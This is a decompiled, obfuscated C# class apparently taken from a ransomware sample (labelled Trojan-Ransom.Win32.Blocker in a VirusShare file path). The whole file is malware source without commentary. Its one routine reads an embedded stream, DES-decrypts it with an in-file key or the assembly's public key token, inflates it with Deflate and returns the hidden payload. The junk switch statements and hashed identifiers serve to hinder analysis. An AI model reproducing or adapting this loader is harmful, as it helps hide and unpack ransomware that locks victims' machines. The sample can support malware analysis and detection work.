// Decompiled with JetBrains decompiler
// Type: A.c70f84ac8de59d9ced869a61ef36ba84c
// Assembly: encrypted, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8081A28B-F501-41E9-8C50-91279EE18641
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aqzw-6bbce56e7d8becb81cd60e57252cb62ea691536669ee9ad99732f11b46da2634.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace A
{
  internal sealed class c70f84ac8de59d9ced869a61ef36ba84c
  {
    private static readonly object c25073ae26569578c1b7dcfb54e63ecf5;
    private static readonly int c8a3ca56b93859114f4c531f5fedc19f3;
    private static readonly int ca5aa0bfcb63b49718c58fd65ca85c864;
    private static readonly MemoryStream c4b574fa9f9d746613c8bc7c4f2096bea = (MemoryStream) null;
    private static readonly MemoryStream cd5b7777bd3f556c179d648fb240e6d4d = (MemoryStream) null;
    private static readonly byte c8363b2e9626696d874f78cf9b378f73c;

    static c70f84ac8de59d9ced869a61ef36ba84c()
    {
      c70f84ac8de59d9ced869a61ef36ba84c.c8a3ca56b93859114f4c531f5fedc19f3 = int.MaxValue;
      c70f84ac8de59d9ced869a61ef36ba84c.ca5aa0bfcb63b49718c58fd65ca85c864 = int.MinValue;
      c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea = c4da3b293bb5014ddec38389a7367e547.c4b3d05783de44619ce53441d5022f0b2(0);
      c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d = c4da3b293bb5014ddec38389a7367e547.c4b3d05783de44619ce53441d5022f0b2(0);
      c70f84ac8de59d9ced869a61ef36ba84c.c25073ae26569578c1b7dcfb54e63ecf5 = c7b67897d1e0e7583827edf7f5a988bc8.c4b3d05783de44619ce53441d5022f0b2();
    }

    private static string cb37e52406bb4146df26e40f5d181a923(Assembly _param0)
    {
      string str = cc5602477941e7385cb77ed456a77fdc8.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param0);
      int num = ca1d7f9b7f370aaf0c942391d73171e75.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, ',');
      if (num >= 0)
        str = cfc85e6360706e0d2ae89c8be96d0dd4f.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, 0, num);
      return str;
    }

    private static byte[] c1f99c8abc58a8d74c78d9426322708e7(Assembly _param0)
    {
      try
      {
        string str = cc5602477941e7385cb77ed456a77fdc8.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param0);
        int num1 = cadd872a5d84c7c3fa04ac63519bdff17.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, "PublicKeyToken=");
        if (num1 < 0)
          num1 = cadd872a5d84c7c3fa04ac63519bdff17.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, "publickeytoken=");
        if (num1 < 0)
        {
label_3:
          switch (4)
          {
            case 0:
              goto label_3;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c70f84ac8de59d9ced869a61ef36ba84c.c1f99c8abc58a8d74c78d9426322708e7);
              }
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (c23841d4720b7b73218d2c531b5b874e7.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, num2) != 'n')
          {
label_8:
            switch (1)
            {
              case 0:
                goto label_8;
              default:
                if (c23841d4720b7b73218d2c531b5b874e7.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, num2) == 'N')
                {
label_10:
                  switch (5)
                  {
                    case 0:
                      goto label_10;
                  }
                }
                else
                {
                  byte[] numArray = c4c78191cb8411d74637fa1d662d2cd94.c4b3d05783de44619ce53441d5022f0b2(c03fe85f7d0fc0cb50d568b2baed2c617.c4b3d05783de44619ce53441d5022f0b2(cfc85e6360706e0d2ae89c8be96d0dd4f.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) str, num2, 16), NumberStyles.HexNumber));
                  c22f7eb16a3d11e28f2bf8e86d36f57fd.c4b3d05783de44619ce53441d5022f0b2((Array) numArray);
                  return numArray;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] c1682b126f4b330c88bbf565961be0991(Stream _param0)
    {
      object c25073ae26569578c1b7dcfb54e63ecf5;
      c9bc6aff6ea93e8f6ca4cf8e9d12f9bff.c4b3d05783de44619ce53441d5022f0b2(c25073ae26569578c1b7dcfb54e63ecf5 = c70f84ac8de59d9ced869a61ef36ba84c.c25073ae26569578c1b7dcfb54e63ecf5);
      try
      {
        return c70f84ac8de59d9ced869a61ef36ba84c.ce24941570d55f3019e3519645be3cc67(97L, _param0);
      }
      finally
      {
        c41ffec6596809c0f052bbfad061dd9ab.c4b3d05783de44619ce53441d5022f0b2(c25073ae26569578c1b7dcfb54e63ecf5);
      }
    }

    internal static byte[] c215faaa291b04bc5cbcd323899a176e3(long _param0, Stream _param1)
    {
      try
      {
        return c70f84ac8de59d9ced869a61ef36ba84c.c1682b126f4b330c88bbf565961be0991(_param1);
      }
      catch (HostProtectionException ex)
      {
        return c70f84ac8de59d9ced869a61ef36ba84c.ce24941570d55f3019e3519645be3cc67(97L, _param1);
      }
    }

    internal static byte[] ce24941570d55f3019e3519645be3cc67(long _param0, Stream _param1)
    {
      Stream stream = _param1;
      MemoryStream memoryStream = (MemoryStream) null;
      ushort num1 = ~(ushort) cbbb1cb43c2cab5f941d3ba609ed57778.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1);
      for (int index = 1; index < 3; ++index)
        cbbb1cb43c2cab5f941d3ba609ed57778.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1);
label_3:
      switch (3)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c70f84ac8de59d9ced869a61ef36ba84c.ce24941570d55f3019e3519645be3cc67);
          }
          if (((int) num1 & 2) != 0)
          {
label_7:
            switch (6)
            {
              case 0:
                goto label_7;
              default:
                DESCryptoServiceProvider cryptoServiceProvider = cd2f1e5c86f0713911531125238605a23.c4b3d05783de44619ce53441d5022f0b2();
                byte[] numArray1 = new byte[8];
                ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1, numArray1, 0, 8);
                c6c0086c4aac3d2c07cd002d61b2887d5.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoServiceProvider, numArray1);
                byte[] numArray2 = new byte[8];
                ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1, numArray2, 0, 8);
                bool flag = true;
                foreach (byte num2 in numArray2)
                {
                  if (num2 != (byte) 0)
                  {
                    flag = false;
                    goto label_14;
                  }
                }
label_13:
                switch (3)
                {
                  case 0:
                    goto label_13;
                }
label_14:
                if (flag)
                {
label_15:
                  switch (1)
                  {
                    case 0:
                      goto label_15;
                    default:
                      numArray2 = c70f84ac8de59d9ced869a61ef36ba84c.c1f99c8abc58a8d74c78d9426322708e7(cdb6673b4884aee7715d4c20f258ae7d0.c4b3d05783de44619ce53441d5022f0b2());
                      break;
                  }
                }
                c6aa1c3b1bb86d50e32ed9f298e199271.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoServiceProvider, numArray2);
                if (c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea == null)
                {
label_18:
                  switch (1)
                  {
                    case 0:
                      goto label_18;
                    default:
                      if (c70f84ac8de59d9ced869a61ef36ba84c.c8a3ca56b93859114f4c531f5fedc19f3 == int.MaxValue)
                      {
                        cd5415ee60663d9941c20c0c4aa4d2b8b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea, (int) c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1));
                        break;
                      }
                      cd5415ee60663d9941c20c0c4aa4d2b8b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea, c70f84ac8de59d9ced869a61ef36ba84c.c8a3ca56b93859114f4c531f5fedc19f3);
                      break;
                  }
                }
                c246324d042379d726625427a77f0edfa.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea, 0L);
                ICryptoTransform cryptoTransform = cd3c3c540f6debf2c5db2a0bae96e820e.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoServiceProvider);
                int num3 = cd2e327a6519e1f09b8dff2ff7f33a0f8.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform);
                c9b44f4e711fc1d3cf1f79f0ecce3424b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform);
                byte[] numArray3 = new byte[c9b44f4e711fc1d3cf1f79f0ecce3424b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform)];
                byte[] numArray4 = new byte[cd2e327a6519e1f09b8dff2ff7f33a0f8.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform)];
                int num4;
                for (num4 = (int) c25c86a26998be4c528e06fa0a3d455aa.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1); (long) (num4 + num3) < c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1); num4 += num3)
                {
                  ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1, numArray4, 0, num3);
                  int num5 = c107f98acb824b9446ed1af394a4d46de.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                  c1064b1bbe9554ce82c21d5e885020f65.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea, numArray3, 0, num5);
                }
label_25:
                switch (5)
                {
                  case 0:
                    goto label_25;
                  default:
                    ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1, numArray4, 0, (int) (c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1) - (long) num4));
                    byte[] numArray5 = c81e86a316114b7159efb6b6aca814f30.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) cryptoTransform, numArray4, 0, (int) (c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1) - (long) num4));
                    c1064b1bbe9554ce82c21d5e885020f65.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea, numArray5, 0, numArray5.Length);
                    stream = (Stream) c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea;
                    c246324d042379d726625427a77f0edfa.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) stream, 0L);
                    memoryStream = c70f84ac8de59d9ced869a61ef36ba84c.c4b574fa9f9d746613c8bc7c4f2096bea;
                    break;
                }
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
label_28:
            switch (1)
            {
              case 0:
                goto label_28;
              default:
                try
                {
                  if (c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d == null)
                  {
                    if (c70f84ac8de59d9ced869a61ef36ba84c.ca5aa0bfcb63b49718c58fd65ca85c864 == int.MinValue)
                    {
label_31:
                      switch (6)
                      {
                        case 0:
                          goto label_31;
                        default:
                          cd5415ee60663d9941c20c0c4aa4d2b8b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d, (int) c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) stream) * 2);
                          break;
                      }
                    }
                    else
                      cd5415ee60663d9941c20c0c4aa4d2b8b.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d, c70f84ac8de59d9ced869a61ef36ba84c.ca5aa0bfcb63b49718c58fd65ca85c864);
                  }
                  c246324d042379d726625427a77f0edfa.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d, 0L);
                  DeflateStream deflateStream = c8b6e9e149aa19782a8197b777d3e8652.c4b3d05783de44619ce53441d5022f0b2(stream, CompressionMode.Decompress);
                  int length = 1000;
                  byte[] numArray = new byte[length];
                  int num6;
                  do
                  {
                    num6 = ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) deflateStream, numArray, 0, length);
                    if (num6 > 0)
                    {
label_36:
                      switch (4)
                      {
                        case 0:
                          goto label_36;
                        default:
                          c1064b1bbe9554ce82c21d5e885020f65.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d, numArray, 0, num6);
                          break;
                      }
                    }
                  }
                  while (num6 >= length);
label_39:
                  switch (7)
                  {
                    case 0:
                      goto label_39;
                    default:
                      memoryStream = c70f84ac8de59d9ced869a61ef36ba84c.cd5b7777bd3f556c179d648fb240e6d4d;
                      break;
                  }
                }
                catch (Exception ex)
                {
                  break;
                }
                break;
            }
          }
          if (memoryStream != null)
          {
label_43:
            switch (5)
            {
              case 0:
                goto label_43;
              default:
                return ce826a4f46d128b233a7b435c95e79564.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) memoryStream);
            }
          }
          else
          {
            byte[] numArray = new byte[c910d28d37bb1bfbb8c36de0285662b19.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1) - c25c86a26998be4c528e06fa0a3d455aa.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1)];
            ceea483c727476a3c0a6b18887be4b4fb.ccec38a7afe2a74fd9aa3d48e60b28bd7((object) _param1, numArray, 0, numArray.Length);
            return numArray;
          }
      }
    }
  }
}
